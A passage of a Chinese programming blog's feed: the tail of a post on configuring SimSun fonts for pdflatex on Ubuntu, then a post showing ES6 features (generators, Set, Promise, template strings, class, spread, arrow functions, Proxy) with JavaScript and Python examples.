</code></pre><p>首先，你得装<code>simsun.ttc</code>这个宋体Truetype字体了。还要改配置，不然找不到字体</p>
<pre><code>!pdfTeX <span class="keyword">error</span>: pdflatex (<span class="keyword">file</span> simsun.ttc): cannot <span class="keyword">open</span> TrueType font <span class="keyword">file</span> <span class="keyword">for</span> reading
</code></pre><p>配置<code>/etc/texmf/texmf.d/01csofont.cnf</code>，添加如下行(因为我的宋体安装在<code>~/.fonts</code>这里)</p>
<pre><code><span class="attribute">OSFONTDIR</span>=<span class="string">~/.fonts</span>
</code></pre><p>更新配置文件</p>
<pre><code><span class="title">sudo</span> update-texmf
</code></pre><p>编译</p>
<pre><code><span class="tag">pdflatex</span> <span class="tag">csosampleUTF8</span><span class="class">.tex</span>
</code></pre><h2 id="附记">附记</h2><p>如果你选择xelatex，就是官方推荐，注意也要更改配置文件。当然，xelatex是要安装的。</p>
<p>参考<a href="https://wiki.archlinux.org/index.php/TeX_Live_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#.E4.B8.AD.E6.96.87.E5.8C.96" target="_blank" rel="external">Archlinux维基关于TexLive中文化</a>。这部分还是我写的哈哈哈。</p>
<p>我要写论文了，have fun</p>
<h2 id="提交时的补记">提交时的补记</h2><p>今天在科技论文在线提交时，发现科技论文在线的标题关键字基金等提取有bug。如果标题或关键字等后面有注释比如<code>% some comments</code>，就不能提取出tex文件中对应内容。</p>
<p>如果发现提交不上去tex源文件，可以检查下是不是有多余的注释。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>原文2015.10.14 14:56 <a href="http://www.jianshu.com/p/1d4c06470960" target="_blank" rel="external">首发简书</a>。</p>
<p>我看到有tex模板。我用ubuntu 14.]]>
    </summary>
    
      <category term="linux" scheme="http://reverland.org/tags/linux/"/>
    
      <category term="tex" scheme="http://reverland.org/tags/tex/"/>
    
      <category term="linux" scheme="http://reverland.org/categories/linux/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[The ES6 features I use these days]]></title>
    <link href="http://reverland.org/javascript/2015/11/21/the-es6-features-i-use-these-days/"/>
    <id>http://reverland.org/javascript/2015/11/21/the-es6-features-i-use-these-days/</id>
    <published>2015-11-21T15:27:27.000Z</published>
    <updated>2015-11-24T03:24:23.024Z</updated>
    <content type="html"><![CDATA[<h2 id="ES6">ES6</h2><p>ES6标准，也称ES2015。在2015年6月正式批准，这是javascript语言标准从2009年首次大版本更新。</p>
<p>这个版本带来了很多新东西，说是新东西，估计基本读者也都见过。比如python中常用的Destructuring assignment、模块导入、generator和map与set，java中的WeakHashMap、Proxy，在coffeescript中常用的class关键字与子类、模板字符串和剩余参数与默认参数等等。处处都已经有了ES6的影子。</p>
<p>最近做了几件事：</p>
<ol>
<li>把nltk中wordnet corpus reader的python代码看了看，依葫芦画瓢画了个纯javascript版。</li>
<li>热情地把<a href="http://eloquentjavascript.net/" target="_blank" rel="external">Eloquent Javascript</a>的项目和练习复习一遍，然后继续接着往下看。</li>
</ol>
<p>对此，有了两个新认识：</p>
<ol>
<li>Python是门强大的语言。特别是前几天在python中看到async关键字之后…</li>
<li>javascript是门强大的语言但并不简单，ES6让它更强大也更好用更简单</li>
</ol>
<p>这时候发现有几个地方用ES6特性非常方便。</p>
<p>本文不会解释这些特性是什么，所以，如果是查资料查到这里，略过吧。</p>
<h2 id="Generator">Generator</h2><p>在<a href="https://github.com/nltk/nltk/blob/develop/nltk/corpus/reader/wordnet.py" target="_blank" rel="external">nltk wordnet corpus</a>中，对wordnet data文件进行逐行解析的时候，这样处理一行内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_iter = iter(line.split())</span><br><span class="line">_next_token = <span class="keyword">lambda</span>: next(_iter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the lemma and part-of-speech</span></span><br><span class="line">    lemma = _next_token()</span><br><span class="line">    pos = _next_token()</span><br><span class="line">    <span class="comment"># get the number of synsets for this lemma</span></span><br><span class="line">    n_synsets = int(_next_token())</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>显然，对每一行，首先生成一个iterator，这个iterator返回这一行用空格分隔的每一个单词。好在ES6中也支持generator/iterator了，对应如下。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> token = util.getIterator(line.split(<span class="regexp">/\s+/</span>).filter(v=&gt;v!==<span class="string">''</span>));</span><br><span class="line"><span class="comment">// or let token = line.split(/\s+/).filter(v=&gt;v!=='')[Symbol.iterator]();</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">// lemma and pos</span></span><br><span class="line">  lemma = token.next().value;</span><br><span class="line">  pos = token.next().value;</span><br><span class="line">  <span class="comment">// get how many synsets for this lemma</span></span><br><span class="line">  nSynsets = <span class="built_in">parseInt</span>(token.next().value);</span><br><span class="line">  assert(nSynsets &gt; <span class="number">0</span>);</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>其中，<code>getIterator</code>定义为一个generator函数，调用这个函数则生成对应的generator，下面的<code>for...of</code>用到了<a href="http://devdocs.io/javascript/global\_objects/symbol/iterator" target="_blank" rel="external"><code>array</code>对象本身就有一个generator函数</a>的特性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">util.getIterator = <span class="function"><span class="keyword">function</span> *(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> array) &#123;</span><br><span class="line">    <span class="keyword">yield</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>nltk中生成ngram的方法的js实现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">ngrams</span>(<span class="params">sequence, n</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Sadly, you cant use arrow function as generator here.</span></span><br><span class="line">  <span class="keyword">let</span>  g = (<span class="function"><span class="keyword">function</span> *(<span class="params">sequence</span>)</span>&#123;<span class="keyword">yield</span> *sequence&#125;)(sequence);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> history = [];</span><br><span class="line">  <span class="keyword">while</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    history.push(g.next().value);</span><br><span class="line">    n--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> g) &#123;</span><br><span class="line">    history.push(item);</span><br><span class="line">    <span class="comment">// look out here.</span></span><br><span class="line">    <span class="comment">// yield history; will yield reference.</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="built_in">Array</span>.from(history);</span><br><span class="line">    history.shift();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Collections">Collections</h2><p>当我尝试用js实现<a href="http://www.matrix67.com/blog/archives/5044" target="_blank" rel="external">matrix67几年前在其博客讲到的新词发现算法</a>时，需要把一个穷举一个序列的所有分割可能。我这样实现的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splitSet</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> *<span class="title">_splitAll</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">yield</span> s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">      <span class="keyword">let</span> left = s.substr(<span class="number">0</span>, i);</span><br><span class="line">      <span class="keyword">let</span> right = s.substr(i);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> wl <span class="keyword">of</span> _splitAll(left)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> wr <span class="keyword">of</span> _splitAll(right)) &#123;</span><br><span class="line">          <span class="keyword">yield</span> wl + <span class="string">" "</span> + wr;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> set = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> w <span class="keyword">of</span> _splitAll(s))&#123;</span><br><span class="line">    set.push(w);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想得很好，通过将序列分为左右两部分递归简化处理。结果发现同一分割出现了多词。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#62; splitSet(&#34;abc&#34;)&#10;[ &#39;abc&#39;, &#39;a bc&#39;, &#39;a b c&#39;, &#39;ab c&#39;, &#39;a b c&#39; ]</span><br></pre></td></tr></table></figure>
<p>相同的结果需要排除，这时候ES6中的<code>Set</code>就很方便了…</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> w <span class="keyword">of</span> _splitAll(s))&#123;</span><br><span class="line">  set.add(w);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> set;</span><br></pre></td></tr></table></figure>
<h2 id="Promise">Promise</h2><p>事实上，任何能使用Promise+Generator的地方我都会用，当然ES7中有了async和await关键字。比如在<a href="https://greasyfork.org/en/scripts/12758-youdaodict" target="_blank" rel="external">youdaodict Userscript</a>中实现调用audio API来播放有道mp3音频文件<a href="stackoverflow.com/questions/28554022/how-can-i-play-sound-with-a-greasemonkey-script-in-firefox-when-theres-a-conte">实现跨域发音的函数</a>.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params">word</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//console.log("[DEBUG] PLAYOUND")</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">playSound</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> source = context.createBufferSource();</span><br><span class="line">    source.buffer = buffer;</span><br><span class="line">    source.connect(context.destination);</span><br><span class="line">    source.start(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> context = <span class="keyword">new</span> AudioContext()</span><br><span class="line">  <span class="keyword">var</span> soundUrl = <span class="string">`https://dict.youdao.com/dictvoice?type=2&amp;audio=<span class="subst">$&#123;word&#125;</span>`</span></span><br><span class="line">  <span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ret = GM_xmlhttpRequest(&#123;</span><br><span class="line">      method: <span class="string">"GET"</span>,</span><br><span class="line">      url: soundUrl,</span><br><span class="line">      responseType: <span class="string">'arraybuffer'</span>,</span><br><span class="line">      onload: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          context.decodeAudioData(res.response, <span class="function"><span class="keyword">function</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">            resolve(buffer);</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          reject(e);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  p.then(playSound, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般的观点是，凡是关系到异步返回值的时候，都应该尽量使用Promise，保证<a href="https://github.com/getify/You-Dont-Know-JS/blob/master/async%20&amp;%20performance/ch3.md" target="_blank" rel="external">回调只被执行一次、更好的错误处理、更明晰的流程结构</a>。</p>
<p>Promise和Generator现在常作为将来ES7中<code>async/await</code>的过渡。比如著名的<code>co</code>模块，以下是一个简化<code>co</code>实现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">co</span>(<span class="params">g</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> it = g.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (result.done)</span><br><span class="line">        <span class="keyword">return</span> result.value;</span><br><span class="line">      <span class="keyword">return</span> result.value.then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> handle(it.next(res))</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> handle(it.next())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说，就是对<code>generator</code>中每个<code>yield</code>出一个promise时，检查这个promise是否已经完成，<br>完成就返回值。没有就在该promise上注册回调让其把完成后的值传回<code>generator</code>并等待<code>generator</code>再返回下一个Promise。</p>
<p>好绕是不是?我跑题了抱歉。</p>
<h2 id="Template_String">Template String</h2><p>其实上面的例子已经用到这个特性了。再举个例子，Coffeescript中可以这样写正则：</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OPERATOR = <span class="regexp">/// ^ (</span><br><span class="line">  ?: [-=]&gt;             <span class="comment"># function</span></span><br><span class="line">   | [-+*/%&lt;&gt;&amp;|^!?=]=  <span class="comment"># compound assign / compare</span></span><br><span class="line">   | &gt;&gt;&gt;=?             <span class="comment"># zero-fill right shift</span></span><br><span class="line">   | ([-+:])\1         <span class="comment"># doubles</span></span><br><span class="line">   | ([&amp;|&lt;&gt;])\2=?      <span class="comment"># logic / shift</span></span><br><span class="line">   | \?\.              <span class="comment"># soak access</span></span><br><span class="line">   | \.&#123;2,3&#125;           <span class="comment"># range or splat</span></span><br><span class="line">) ///</span></span><br></pre></td></tr></table></figure>
<p>非常方便不是？虽然我开始是在<a href="www.nltk.org/book/ch03.html">nltk</a>中看到了这个功能，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">'That U.S.A. poster-print costs $12.40...'</span></span><br><span class="line">pattern = <span class="string">r'''(?x)    # set flag to allow verbose regexps</span><br><span class="line">    ([A-Z]\.)+        # abbreviations, e.g. U.S.A.</span><br><span class="line">  | \w+(-\w+)*        # words with optional internal hyphens</span><br><span class="line">  | \$?\d+(\.\d+)?%?  # currency and percentages, e.g. $12.40, 82%</span><br><span class="line">  | \.\.\.            # ellipsis</span><br><span class="line">  | [][.,;"'?():-_`]  # these are separate tokens;</span><br><span class="line">'''</span></span><br><span class="line">nltk.regexp_tokenize(text, pattern)</span><br><span class="line">[<span class="string">'That'</span>, <span class="string">'U.S.A.'</span>, <span class="string">'poster-print'</span>, <span class="string">'costs'</span>, <span class="string">'$12.40'</span>, <span class="string">'...'</span>]</span><br></pre></td></tr></table></figure>
<p>想了想如何在js中自己实现，忽然想到了template string这个特性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">strings</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> returnS;</span><br><span class="line">  <span class="comment">// remove all space;</span></span><br><span class="line">  returnS = strings[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">let</span> comment = <span class="regexp">/\/\/.*\n/g</span>;</span><br><span class="line">  returnS = returnS.replace(comment, <span class="string">""</span>);</span><br><span class="line">  returnS = returnS.replace(<span class="regexp">/\s+/g</span>,<span class="string">""</span>);</span><br><span class="line">  <span class="keyword">return</span> returnS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r<span class="string">`</span><br><span class="line">    ([A-Z]\.)+        // abbreviations, e.g. U.S.A.</span><br><span class="line">  | \w+(-\w+)*        // words with optional internal hyphens</span><br><span class="line">  | \$?\d+(\.\d+)?%?  // currency and percentages, e.g. $12.40, 82%</span><br><span class="line">  | \.\.\.            // ellipsis</span><br><span class="line">  | [][.,;"'?():-_\`] // these are separate tokens; includes ], [</span><br><span class="line">`</span></span><br></pre></td></tr></table></figure>
<p>这里用到了<a href="http://devdocs.io/javascript/template_strings" target="_blank" rel="external">Tagged template strings</a>的特性。</p>
<p>另外，如果是多行连续文本时也应该使用template string。</p>
<h2 id="class">class</h2><p>从本质上讲，javascript中的所有面向对象机制都是建构在原型链上的，但class这种语法糖也能比较方便。在coffeescript中我觉得那种浓烈ruby风的写法更合心意一些，<code>class</code>关键字总有些不怎么顺手的地方，比如 <em>设置类静态变量</em> 和有争议的 <em>mixin</em> 。参照nltk wordnet corpus reader类的时候也简单实践了下class关键字、继承等的使用。简单使用还是挺顺手的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Synset</span> <span class="keyword">extends</span> <span class="title">_WordNetObject</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* lemma.pos.number to get a synset */</span></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="comment">// initialized by the Reader</span></span><br><span class="line">    <span class="keyword">this</span>._name = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>._offset = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>._lexname = <span class="literal">null</span>; <span class="comment">// lexicographer file e.g. noun.animal</span></span><br><span class="line">    <span class="keyword">this</span>._pos = <span class="literal">null</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h2 id="destructuring_assign">destructuring assign</h2><p>这是，非常好用的语法糖。终于可以</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a, b] = [<span class="number">1</span>, <span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<h2 id="Spread_Operator">Spread Operator</h2><p>各种语法糖，处理rest parameter时省心很多，而且返回的是一个真正的Array对象。比较有意思的一个例子是，有次见有人讨论如何把<code>Math.min</code>应用到数组上。他说到javascript高级程序设计上的例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">min</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.min.apply(<span class="built_in">Math</span>, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>认为应该把<code>this</code>绑定到<code>null</code>而不是<code>Math</code>，于是我才知道<code>apply</code>时还是要小心不要污染全局变量空间。。。不过这个例子，我去翻了下<a href="https://github.com/v8/v8/blob/44c44521ae11859478b42004f57ea93df52526ee/src/js/math.js#L110-135" target="_blank" rel="external">v8的math.js</a>和<a href="https://github.com/ricardoquesada/Spidermonkey/blob/master/js/src/jsmath.cpp#L593-L616" target="_blank" rel="external">spidermonkey的Math实现</a>，都不关this什么事，所以，我觉得，爱绑定啥都行。。。</p>
<p>关键在于，有了spread operator之后</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.min(...array);</span><br></pre></td></tr></table></figure>
<p>就行了。这些类似的应用场景很多的，比如打印数组中每个成员</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(...array);</span><br></pre></td></tr></table></figure>
<p>少写多少代码：）</p>
<h2 id="Arrow_Function">Arrow Function</h2><p>在前面的例子中你应该已经见到过，箭头函数让书写匿名函数(lambda)变得异常方便(少打很多字)，除了不能用箭头函数写一个generator这个设定有些意外。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(v=&gt;v+<span class="number">1</span>)(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>另外，箭头函数的this是提前绑定到所在词法作用域内的(和调用者无关、apply等指定的<code>this</code>都无关)，有兴趣的同学大概可以去看看v8和SpiderMonkey怎么实现的。</p>
<h2 id="Proxy">Proxy</h2><p>差点忘了这个，因为，目前，截至到本文发稿，v8并不支持标准中的新特性(<code>--harmony_proxies</code>开启的是已废弃的Proxy API)，所以node也不支持。firefox倒是支持非常好哈哈。</p>
<p>在python中，标准库中有个较<code>defaultdict</code>的东西。有什么作用看看下面的例子就知道了。事实上，nltk wordnet corpus reader生成映射的时候很依赖这个功能。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [3]: from collections import defaultdict</span><br><span class="line"></span><br><span class="line">In [4]: expanded_dict = defaultdict(dict)</span><br><span class="line"></span><br><span class="line">In [5]: expanded_dict['a']['b'] = 1</span><br><span class="line"></span><br><span class="line">In [6]: expanded_dict</span><br><span class="line">Out[6]: defaultdict(&lt;type 'dict'&gt;, &#123;'a': &#123;'b': 1&#125;&#125;)</span><br><span class="line"></span><br><span class="line">In [7]: dict['a']['b']</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input-7-07dd2e624242&gt; in &lt;module&gt;()</span><br><span class="line">----&gt; 1 dict['a']['b']</span><br><span class="line"></span><br><span class="line">TypeError: 'type' object has no attribute '__getitem__'</span><br></pre></td></tr></table></figure>
<p>显然我们不想让不存在的东西报错，我们也不想每次都写个if语句判断是吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> dct[<span class="string">'a'</span>]:</span><br><span class="line">    dct[<span class="string">'a'</span>] = &#123;&#125;</span><br><span class="line">dct[<span class="string">'a'</span>][<span class="string">'b'</span>] = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>如果你知道<code>dct</code>中有哪些键当然也能全首先赋成字典，但是，很多情况下你并不知道有哪些键，还得依靠if来判断。<code>defaultdict</code>优雅的解决了这个问题。</p>
<p>遗憾的是，javascript中没有这种东西。忽然想到了<a href="https://hacks.mozilla.org/2015/07/es6-in-depth-proxies-and-reflect/" target="_blank" rel="external">ES6 in Depth: Proxies</a>中的例子，想到可以依靠这个特性自己实现一个<code>defaultdict</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Defaultdict</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  handler = &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">target, prop, receiver</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!(prop <span class="keyword">in</span> target)) &#123;</span><br><span class="line">        target[prop] = &#123;&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> target[prop];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Proxy</span>(<span class="keyword">this</span>, handler);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> expandedDct = <span class="keyword">new</span> Defaultdict();</span><br><span class="line">expandedDct.a.b = <span class="number">1</span>;</span><br><span class="line">expandedDct.c.d = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(expandedDct.a.b)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(expandedDct));</span><br></pre></td></tr></table></figure>
<p>目前只有firefox支持标准的Proxy API。当然V8/node中可以polyfill出来，请自行github。</p>
<p>用<code>Proxy</code>可以结合<code>Map</code>来实现<code>Map</code>版本的DefaultMap哈哈。</p>
